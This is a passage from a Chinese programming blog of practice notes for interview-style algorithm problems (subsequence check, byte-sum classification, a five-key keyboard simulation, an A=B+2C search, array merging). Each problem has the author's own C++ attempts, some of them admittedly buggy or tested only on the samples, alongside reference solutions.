class="type">int</span>,vector&lt;<span class="type">int</span>&gt; &gt; &gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span>(it=sortedsc.<span class="built_in">begin</span>(); it!=sortedsc.<span class="built_in">end</span>();it++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(it-&gt;second[<span class="number">0</span>]&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">         cout&lt;&lt;it-&gt;first;</span><br><span class="line">        <span class="keyword">if</span>(it+<span class="number">1</span>!=sortedsc.<span class="built_in">end</span>())   <span class="comment">//如果不是最后一位，输出逗号</span></span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="4-子串匹配"><a href="#4-子串匹配" class="headerlink" title="4.子串匹配"></a>4.子串匹配</h1><p>链接：<a href="https://www.nowcoder.com/questionTerminal/5382ff24fbf34a858b15f93e2bd85307?f=discussion">https://www.nowcoder.com/questionTerminal/5382ff24fbf34a858b15f93e2bd85307?f=discussion</a><br>来源：牛客网</p>
<p>给定两个字符串 s和 t ，判断 s是否为 t 的子序列。</p>
<p>  你可以认为 s 和 t 中仅包含英文小写字母。字符串 t 可能会很长（长度n ~&#x3D; 500,000），而 s 是个短字符串（长度 &lt;&#x3D;100）。  </p>
<p>  字符串的一个子序列是原始字符串删除一些（也可以不删除）字符而不改变剩余字符相对位置形成的新字符串。（例如，”ace”是”abcde”的一个子序列，而”aec”不是）。  </p>
<p>  进阶：时间复杂度O(n) O(n)\ O(n) ，空间复杂度O(n) O(n)\ O(n) </p>
<h3 id="输入描述-2"><a href="#输入描述-2" class="headerlink" title="输入描述:"></a><strong>输入描述:</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">共两行，第一行为字符串s,  第二行为字符串t</span><br><span class="line">字符串t的长度 1&lt;=n&lt;=500000</span><br><span class="line">字符串s的长度 1&lt;=m&lt;=100</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-2"><a href="#输出描述-2" class="headerlink" title="输出描述:"></a><strong>输出描述:</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出true或者是false，true表示是s是t的子序列，false表示s不是t的子序列</span><br></pre></td></tr></table></figure>

<p>示例1</p>
<h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc</span><br><span class="line">ahbgdc</span><br></pre></td></tr></table></figure>

<h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">true</span><br></pre></td></tr></table></figure>

<h3 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    string s, t;</span><br><span class="line">    cin&gt;&gt;s&gt;&gt;t;</span><br><span class="line">    int index=0;</span><br><span class="line">    for(int i=0;i&lt;s.size();)</span><br><span class="line">    &#123;</span><br><span class="line">        if(index&gt;=t.size())</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;&quot;false&quot;;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        if(s[i]==t[index])</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">        cout&lt;&lt;&quot;true&quot;;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="5-数据分类"><a href="#5-数据分类" class="headerlink" title="5.数据分类"></a>5.数据分类</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>对一个数据<code>a</code>进行分类，<br>分类方法是，此数据<code>a</code>(4个字节大小)的4个字节相加对一个给定值<code>b</code>取模，<br>如果得到的结果小于一个给定的值<code>c</code>则数据<code>a</code>为有效类型，其类型为取模的值。<br>如果得到的结果大于或者等于<code>c</code>则数据<code>a</code>为无效类型。</p>
<p>比如一个数据<code>a = 0x01010101</code>，<code>b = 3</code><br>按照分类方法计算：<code>(0x01 + 0x01 + 0x01 + 0x01) % 3 = 1</code><br>所以如果<code>c</code>等于<code>2</code>，则此<code>a</code>就是有效类型，其类型为<code>1</code><br>如果<code>c</code>等于<code>1</code>，则此<code>a</code>是无效类型</p>
<p>又比如一个数据<code>a = 0x01010103</code>，<code>b = 3</code><br>按分类方法计算：<code>(0x01 + 0x01 + 0x01 + 0x03) % 3 = 0</code><br>所以如果<code>c = 2</code>则此<code>a</code>就是有效类型，其类型为<code>0</code><br>如果<code>c = 0</code>则此<code>a</code>是无效类型</p>
<p>输入<code>12</code>个数据，<br>第一个数据为<code>c</code>，第二个数据为<code>b</code>，<br>剩余<code>10</code>个数据为需要分类的数据</p>
<p>请找到有效类型中包含数据最多的类型，<br>并输出该类型含有多少个数据</p>
<h2 id="输入描述-3"><a href="#输入描述-3" class="headerlink" title="输入描述"></a>输入描述</h2><p>输入<code>12</code>个数据用空格分割，<br>第一个数据为<code>c</code>，第二个数据为<code>b</code>，<br>剩余<code>10</code>个数据为需要分类的数据。</p>
<h2 id="输出描述-3"><a href="#输出描述-3" class="headerlink" title="输出描述"></a>输出描述</h2><p>请找到有效类型中包含数据最多的类型，<br>并输出该类型含有多少个数据。</p>
<h2 id="示例一-2"><a href="#示例一-2" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3 4 256 257 258 259 260 261 262 263 264 265</span><br></pre></td></tr></table></figure>

<h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>

<h3 id="个人代码"><a href="#个人代码" class="headerlink" title="个人代码"></a>个人代码</h3><blockquote>
<p>将十进制转化为十六进制，说是四字节，那就是8个值，我用的vector(8,0)记录</p>
<p>十六进制加和，那就是8个值中两两组合，a*16+b</p>
<p>再将模后的值存入新的vector，用来统计出现次数，从大到小排序，输出最大值</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">zijie</span><span class="params">(<span class="type">int</span> num)</span><span class="comment">//十进制处理成十六进制</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="comment">//四个字节，8个值</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">s</span><span class="params">(<span class="number">8</span>,<span class="number">0</span>)</span></span>; <span class="comment">//默认0填充</span></span><br><span class="line">    <span class="comment">//十六进制 //四字节</span></span><br><span class="line">    <span class="type">int</span> index=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(num/<span class="number">16</span>!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> shang=num/<span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> yushu=num%shang;</span><br><span class="line">        num=shang;</span><br><span class="line">        <span class="comment">//s.push_back(yushu);</span></span><br><span class="line">        s[index]=yushu;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//一定有一个1；</span></span><br><span class="line">    s[index]=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">end</span>()); <span class="comment">//反转</span></span><br><span class="line">    <span class="comment">//   for(int i=0;i&lt;ss.size();i++)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     cout&lt;&lt;ss[i]&lt;&lt;&quot;,&quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">jiahe</span><span class="params">(vector&lt;<span class="type">int</span>&gt; s,<span class="type">int</span> b)</span><span class="comment">//十六进制各部分加和，再模b</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i=i+<span class="number">2</span>)<span class="comment">//</span></span><br><span class="line">    &#123;</span><br><span class="line">        sum+=s[i]*<span class="number">16</span>+s[i+<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum%b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; ss;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;num)</span><br><span class="line">    &#123;</span><br><span class="line">        ss.<span class="built_in">push_back</span>(num);</span><br><span class="line">        <span class="keyword">if</span>(cin.<span class="built_in">get</span>()==<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// for(int i=0;i&lt;ss.size();i++)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     cout&lt;&lt;ss[i]&lt;&lt;&quot;,&quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="type">int</span> c=ss[<span class="number">0</span>],b=ss[<span class="number">1</span>];</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; leixing;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;ss.<span class="built_in">size</span>();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        leixing.<span class="built_in">push_back</span>(<span class="built_in">jiahe</span>(<span class="built_in">zijie</span>(ss[i]),b));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ss.clear();//只会重置size</span></span><br><span class="line">    <span class="comment">// for(int i = 0; i &lt; ss.size(); ++i)//删除ss的元素，以便之后使用</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//      delete ss[i];</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// ss.clear();</span></span><br><span class="line">    <span class="comment">//想要清空元素，重复利用ss，不行，嘶</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">zhi</span><span class="params">(<span class="number">100</span>,<span class="number">0</span>)</span></span>;<span class="comment">//暂时记为模的最大值为99吧</span></span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;leixing.<span class="built_in">size</span>();i++)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="comment">// cout&lt;&lt;leixing[i]&lt;&lt;&quot;,&quot;;</span></span><br><span class="line">        <span class="keyword">if</span>(leixing[i]&lt;c)</span><br><span class="line">        &#123;</span><br><span class="line">           zhi[leixing[i]]++; <span class="comment">//比如模后的值是4，s[4]++</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(zhi.<span class="built_in">begin</span>(),zhi.<span class="built_in">end</span>());<span class="comment">//默认从小到大排序</span></span><br><span class="line">    <span class="built_in">reverse</span>(zhi.<span class="built_in">begin</span>(),zhi.<span class="built_in">end</span>());<span class="comment">//</span></span><br><span class="line">    cout&lt;&lt;zhi[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">//cout&lt;&lt;jiahe(zhi,3);</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考wp（map映射）"><a href="#参考wp（map映射）" class="headerlink" title="参考wp（map映射）"></a>参考wp（map映射）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">#include&lt;string&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int jiahe(int num);</span><br><span class="line">void solution(vector&lt;int&gt; s)//</span><br><span class="line">&#123;</span><br><span class="line">     int c=s[0];</span><br><span class="line">     int b=s[1];</span><br><span class="line">     map&lt;int,int&gt; mp;//映射</span><br><span class="line">     for(int i=2;i&lt;s.size();i++)</span><br><span class="line">     &#123;</span><br><span class="line">        int r=jiahe(s[i])%b;</span><br><span class="line">        if(r&lt;c) mp[r]=mp.count(r)?mp[r]+1:1;//键值相同+1，没有则置1</span><br><span class="line">     &#125;</span><br><span class="line">     int max=0;</span><br><span class="line">    // map&lt;int,int&gt;::iterator it;</span><br><span class="line">     for(const auto&amp; pair:mp)</span><br><span class="line">     &#123;</span><br><span class="line">        if(pair.second&gt;max) max=pair.second;</span><br><span class="line">     &#125;</span><br><span class="line">     cout&lt;&lt;max;</span><br><span class="line">&#125;</span><br><span class="line">int jiahe(int num)//十六进制各部分加和</span><br><span class="line">&#123;</span><br><span class="line">    int sum=0;</span><br><span class="line">    for(int i=0;i&lt;4;i++)//</span><br><span class="line">    &#123;</span><br><span class="line">        sum+=static_cast&lt;char&gt;(num&gt;&gt;i*8);</span><br><span class="line">    &#125;</span><br><span class="line">    return sum;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;int&gt; ss;</span><br><span class="line">    int num;</span><br><span class="line">    while(cin&gt;&gt;num)</span><br><span class="line">    &#123;</span><br><span class="line">        ss.push_back(num);</span><br><span class="line">        if(cin.get()==&#x27;\n&#x27;) break;</span><br><span class="line">    &#125;</span><br><span class="line">    solution(ss);</span><br><span class="line">    </span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>map.find()是迭代器指向元素 if maps.find(1)&#x3D;&#x3D;maps.end()，无该元素</p>
<p>map.count()，结果只为0或1</p>
<p>static_cast 强制类型转化操作</p>
<p>&gt;&gt;i*8 取字节 (i&#x3D;0-3)：</p>
<p>四字节32位是以大端方式排列的，</p>
<p>即最高位（最左）-&gt;最低位（最右）</p>
<p>259为例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int num=259;</span><br><span class="line">   cout&lt;&lt;hex&lt;&lt;259&lt;&lt;endl;</span><br><span class="line">   cout&lt;&lt;(num&gt;&gt;0)&lt;&lt;&quot; char:&quot;&lt;&lt;int(static_cast&lt;char&gt;(num&gt;&gt;0))&lt;&lt;endl;</span><br><span class="line">   cout&lt;&lt;(num&gt;&gt;8)&lt;&lt;&quot; char:&quot;&lt;&lt;int(static_cast&lt;char&gt;(num&gt;&gt;8))&lt;&lt;endl;</span><br><span class="line">   cout&lt;&lt;(num&gt;&gt;2*8)&lt;&lt;&quot; char:&quot;&lt;&lt;int(static_cast&lt;char&gt;(num&gt;&gt;16))&lt;&lt;endl;</span><br><span class="line">   cout&lt;&lt;(num&gt;&gt;3*8)&lt;&lt;&quot; char:&quot;&lt;&lt;int(static_cast&lt;char&gt;(num&gt;&gt;24))&lt;&lt;endl;</span><br></pre></td></tr></table></figure>

<p>结果为：（不纠结了，就这么记着吧）</p>
<blockquote>
<p>103<br>103 char:3<br>1 char:1<br>0 char:0<br>0 char:0 </p>
</blockquote>
</blockquote>
<h1 id="6-5键键盘"><a href="#6-5键键盘" class="headerlink" title="6.5键键盘"></a>6.5键键盘</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p>有一个特殊的五键键盘<br>上面有<code>A</code>、<code>Ctrl-C</code>、<code>Ctrl-X</code>、<code>Ctrl-V</code>、<code>Ctrl-A</code><br><code>A</code>键在屏幕上输出一个字母<code>A</code><br><code>Ctrl-C</code>将当前所选的字母复制到剪贴板<br><code>Ctrl-X</code>将当前选择的字母复制到剪贴板并清空所选择的字母<br><code>Ctrl-V</code>将当前剪贴板的字母输出到屏幕<br><code>Ctrl-A</code>选择当前屏幕中所有字母<br>注意：</p>
<ol>
<li>剪贴板初始为空</li>
<li>新的内容复制到剪贴板会覆盖原有内容</li>
<li>当屏幕中没有字母时,<code>Ctrl-A</code>无效</li>
<li>当没有选择字母时<code>Ctrl-C</code>、<code>Ctrl-X</code>无效</li>
<li>当有字母被选择时<code>A</code>和<code>Ctrl-V</code>这两个输出功能的键,<br>会先清空所选的字母再进行输出</li>
</ol>
<p>给定一系列键盘输入,<br>输出最终屏幕上字母的数量</p>
<h2 id="输入描述-4"><a href="#输入描述-4" class="headerlink" title="输入描述"></a>输入描述</h2><p>输入为一行<br>为简化解析用数字<code>12345</code>分别代替<code>A</code>、<code>Ctrl-C</code>、<code>Ctrl-X</code>、<code>Ctrl-V</code>、<code>Ctrl-A</code>的输入<br>数字用空格分割</p>
<h2 id="输出描述-4"><a href="#输出描述-4" class="headerlink" title="输出描述"></a>输出描述</h2><p>输出一个数字为屏幕上字母的总数量</p>
<h2 id="示例一-3"><a href="#示例一-3" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 1 1</span><br></pre></td></tr></table></figure>

<p>Copy</p>
<h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>

<h2 id="示例二"><a href="#示例二" class="headerlink" title="示例二"></a>示例二</h2><h3 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 1 5 1 5 2 4 4</span><br></pre></td></tr></table></figure>

<h3 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>

<h2 id="个人代码-仅试过用例"><a href="#个人代码-仅试过用例" class="headerlink" title="个人代码(仅试过用例)"></a>个人代码(仅试过用例)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">using namespace std;</span><br><span class="line">void solution(vector&lt;int&gt; ss)</span><br><span class="line">&#123;</span><br><span class="line">    int token=0,co=0;//缓冲区的字母数 与 目前字母数</span><br><span class="line">    int onxuanze=-1,onzimu=-1,c=-1;//被选择、有输入字母、复制操作</span><br><span class="line">    for(int i=0;i&lt;ss.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        //token+=ss[i];</span><br><span class="line">        if(ss[i]==1) //输入值</span><br><span class="line">        &#123;</span><br><span class="line">            //说明有输入，如果有选择命令，则覆盖</span><br><span class="line">            //没有则追加输入</span><br><span class="line">          //  onzimu=1;   //有值</span><br><span class="line">           // if(onxuanze&gt;0) //选中值</span><br><span class="line">           if(ss[i-1]==5) //选中一定是紧挨的操作，否则不成立</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                co=1;  //直接覆盖</span><br><span class="line">            &#125;</span><br><span class="line">            else co++;</span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line">          if(ss[i]==2)//复制  </span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            if(ss[i-1]==5)//要复制一定有选中，是紧挨的选中</span><br><span class="line">            &#123;</span><br><span class="line">                token=co;</span><br><span class="line">                c=1;</span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(ss[i]==3)//剪切</span><br><span class="line">        &#123;</span><br><span class="line">            if(ss[i-1]==5)</span><br><span class="line">            &#123;</span><br><span class="line">              token=co;</span><br><span class="line">              co=0;</span><br><span class="line">              onzimu=-9;//清空字母</span><br><span class="line">              c=1;//复制</span><br><span class="line">            &#125;   </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        int v=0;</span><br><span class="line">        if(ss[i]==4) //输出</span><br><span class="line">        &#123;      </span><br><span class="line">            </span><br><span class="line">            if(c&gt;0) //原地v</span><br><span class="line">            &#123;</span><br><span class="line">                co=token;//这种是选中后，复制，再v，所以覆盖</span><br><span class="line">                v++;</span><br><span class="line">            &#125; </span><br><span class="line">           </span><br><span class="line">            //那追加v怎么办呢？</span><br><span class="line">            if(v&gt;0) co+=token;</span><br><span class="line">            //如果选中了，直接v，那就是覆盖了</span><br><span class="line">            /*</span><br><span class="line">            它可以是选择，复制，再v，也是一样的覆盖</span><br><span class="line">             1 1 5 1 5 2 4 4应该是输出2，而不是3</span><br><span class="line">            它这种情况就是，选中后不一定马上v，会有复制的情况</span><br><span class="line">             */</span><br><span class="line">           // if(ss[i-1]==5) co=token;           </span><br><span class="line">        &#125;</span><br><span class="line">        // if(ss[i]==5) //选中</span><br><span class="line">        // &#123;</span><br><span class="line">        //     if(onzimu&gt;0) //有字母</span><br><span class="line">        //     &#123;</span><br><span class="line">        //         onxuanze=1;</span><br><span class="line">        //         //token=co; //当前选中数</span><br><span class="line">        //     &#125;</span><br><span class="line">             </span><br><span class="line">        // &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;co;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;int&gt; ss;</span><br><span class="line">    string t;</span><br><span class="line">    while(cin&gt;&gt;t)</span><br><span class="line">    &#123;</span><br><span class="line">        ss.push_back(stoi(t));</span><br><span class="line">         if(cin.get()==&#x27;\n&#x27;) break;</span><br><span class="line">    &#125;</span><br><span class="line">    solution(ss);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><p>用字符串cur记录当前的输出字母”A”</p>
<p>cur的长度即为最终输出</p>
<p>copy为缓冲区里的字母</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void solution(vector&lt;int&gt; ss)</span><br><span class="line">&#123;</span><br><span class="line">    string copy=&quot;&quot;;    //剪切板</span><br><span class="line">   // string select=&quot;&quot;; </span><br><span class="line">    string cur=&quot;&quot;; //当前面板</span><br><span class="line">    int flag=0; //是否选中</span><br><span class="line">    for(int op:ss)&#123;</span><br><span class="line">        switch(op)</span><br><span class="line">        &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            if(flag!=1)</span><br><span class="line">           &#123;</span><br><span class="line">                cur+=&quot;A&quot;;</span><br><span class="line">                flag=0;</span><br><span class="line">           &#125;</span><br><span class="line">           else</span><br><span class="line">           &#123;</span><br><span class="line">             cur=&quot;&quot;; //</span><br><span class="line">             cur+=&quot;A&quot;;</span><br><span class="line">             flag=0;</span><br><span class="line">           &#125;</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            if((cur.size()!=0)&amp;&amp;(flag!=0)) //没有选中</span><br><span class="line">            &#123;</span><br><span class="line">                copy=cur;    //复制</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        case 3:</span><br><span class="line">            if((cur.size()!=0)&amp;&amp;(flag!=0))&#123; </span><br><span class="line">                copy=cur;</span><br><span class="line">                cur=&quot;&quot;;    //清零</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        case 4:   //输出</span><br><span class="line">            if((copy.size()!=0)&amp;&amp;(flag!=0))&#123; </span><br><span class="line">                cur=copy;</span><br><span class="line">                flag=0;</span><br><span class="line">            &#125;</span><br><span class="line">            else if(copy.size()!=0)//选中了</span><br><span class="line">            &#123;</span><br><span class="line">                cur+=copy;</span><br><span class="line">                flag=0;</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        case 5:</span><br><span class="line">           flag=1;</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;cur.size();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="7-检查是否存在满足条件的数字组合"><a href="#7-检查是否存在满足条件的数字组合" class="headerlink" title="7.检查是否存在满足条件的数字组合"></a>7.检查是否存在满足条件的数字组合</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定一个正整数数组，检查数组中是否存在满足规则的数字组合</p>
<p>规则：A &#x3D; B + 2C</p>
<h2 id="输入描述-5"><a href="#输入描述-5" class="headerlink" title="输入描述"></a>输入描述</h2><p>第一行输出数组的元素个数。</p>
<p>接下来一行输出所有数组元素，用空格隔开。</p>
<h2 id="输出描述-5"><a href="#输出描述-5" class="headerlink" title="输出描述"></a>输出描述</h2><p>如果存在满足要求的数，在同一行里依次输出规则里A&#x2F;B&#x2F;C的取值，用空格隔开。</p>
<p>如果不存在，输出0。</p>
<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>数组长度在3-100之间。<br>数组成员为0-65535，数组成员可以重复，但每个成员只能在结果算式中使用一次。如：数组成员为[0, 0, 1, 5]，0出现2次是允许的，但结果0 &#x3D; 0 + 2 * 0是不允许的，因为算式中使用了3个0。<br>用例保证每组数字里最多只有一组符合要求的解。</p>
<h2 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h2><p>4<br>2 7 3 0</p>
<h2 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h2><p>7 3 2</p>
<h2 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h2><p>7 &#x3D; 3 + 2 * 2</p>
<h2 id="个人代码-3for"><a href="#个人代码-3for" class="headerlink" title="个人代码(3for)"></a>个人代码(3for)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//a=b+2c，同一个数字最多出现1次</span><br><span class="line">//a-b=2c  =&gt;(a-b)/2=c</span><br><span class="line">//用例保证了只有一组符号要求的解</span><br><span class="line">void solution(vector&lt;int&gt; s)</span><br><span class="line">&#123;</span><br><span class="line">    for(int i=0;i&lt;s.size();i++)&#123;</span><br><span class="line">        for(int j=0;j&lt;s.size();j++)&#123;</span><br><span class="line">              for(int k=0;k&lt;s.size();k++)&#123;</span><br><span class="line">                if(i==j||i==k||k==j) continue;</span><br><span class="line">                if((s[i]-s[j])==2*s[k])</span><br><span class="line">                &#123;</span><br><span class="line">                        cout&lt;&lt;s[i]&lt;&lt;&quot; &quot;&lt;&lt;s[j]&lt;&lt;&quot; &quot;&lt;&lt;s[k];</span><br><span class="line">                        exit(0);</span><br><span class="line">                &#125;   </span><br><span class="line">                  if((s[i]-s[k])==2*s[j])</span><br><span class="line">                &#123;</span><br><span class="line">                        cout&lt;&lt;s[i]&lt;&lt;&quot; &quot;&lt;&lt;s[k]&lt;&lt;&quot; &quot;&lt;&lt;s[j];</span><br><span class="line">                        exit(0);</span><br><span class="line">                &#125;   </span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        cout&lt;&lt;0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int length,num;</span><br><span class="line">    cin&gt;&gt;length;</span><br><span class="line">    vector&lt;int&gt; s;</span><br><span class="line"></span><br><span class="line">    while(cin&gt;&gt;num)</span><br><span class="line">    &#123;</span><br><span class="line">        s.push_back(num);</span><br><span class="line">        if(cin.get()==&#x27;\n&#x27;) break;</span><br><span class="line">    &#125;</span><br><span class="line">    solution(s);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="8-数组拼接"><a href="#8-数组拼接" class="headerlink" title="*8.数组拼接"></a>*8.数组拼接</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h2><p>现在有多组整数数组，需要将他们合并成一个新的数组。合并规则，从每个数组里按顺序取出固定长度的内容合并到新的数组中，取完的内容会删除掉，如果该行不足固定长度或者已经为空，则直接取出剩余部分的内容放到新的数组中，继续下一行。如样例1，获得长度3，先遍历第一行，获得2,5,6；再遍历第二行，获得1,7,4；再循环回到第一行，获得7,9,5；再遍历第二行，获得3,4；再回到第一行，获得7，按顺序拼接成最终结果。</p>
